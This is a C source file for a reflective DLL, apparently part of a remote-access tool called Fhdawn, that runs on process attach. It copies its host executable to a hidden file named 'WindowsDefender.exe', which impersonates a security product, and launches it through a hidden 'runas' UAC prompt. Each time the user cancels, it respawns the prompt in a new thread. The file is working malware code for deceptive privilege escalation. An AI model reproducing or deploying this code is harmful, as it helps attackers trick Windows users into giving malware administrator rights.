//===============================================================================================//
// This DLL will execute Fhdawn as administrator
//===============================================================================================//

#include "ReflectiveLoader.h"
#include "FileTunnel.h"
#include <shellapi.h>

void UACTrigger() {
    TCHAR DIR[MAX_PATH];
    char err[200];
    GetModuleFileName(NULL, DIR, MAX_PATH);

    SHELLEXECUTEINFO sei = {sizeof(sei)};

    // WriteOutput("Copying to WindowsDefender.exe\n");
    if(!CopyFile( DIR , "WindowsDefender.exe", FALSE ))
    {
        // memset(err, 0, 200);
        // snprintf(err, 200,"\nError : %i\n", GetLastError());
        // WriteOutput("Error Copying file!");
        // WriteOutput(err);
    }

    DWORD attributes = GetFileAttributes("WindowsDefender.exe");
    if (attributes != FILE_ATTRIBUTE_HIDDEN)
    {
        // WriteOutput("Hiding WindowsDefender.exe");
        SetFileAttributes("WindowsDefender.exe", attributes + FILE_ATTRIBUTE_HIDDEN);
    }

    sei.lpVerb = "runas";
    sei.lpFile = "WindowsDefender.exe";
    sei.hwnd = NULL;
    sei.nShow = SW_HIDE;

    // WriteOutput("Triggering UAC Prompt\n");
    if (!ShellExecuteEx(&sei)) {
        DWORD dwError = GetLastError();
        if (dwError == ERROR_CANCELLED)
        CreateThread(0, 0, (LPTHREAD_START_ROUTINE) UACTrigger, 0, 0, 0);
    }
}

extern HINSTANCE hAppInstance;
//===============================================================================================//
BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
{
    BOOL bReturnValue = TRUE;
	switch( dwReason ) 
    { 
		case DLL_QUERY_HMODULE:
			if( lpReserved != NULL )
				*(HMODULE *)lpReserved = hAppInstance;
			break;
		case DLL_PROCESS_ATTACH:
			hAppInstance = hinstDLL;
			UACTrigger();
			break;
		case DLL_PROCESS_DETACH:
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
            break;
    }
	return bReturnValue;
}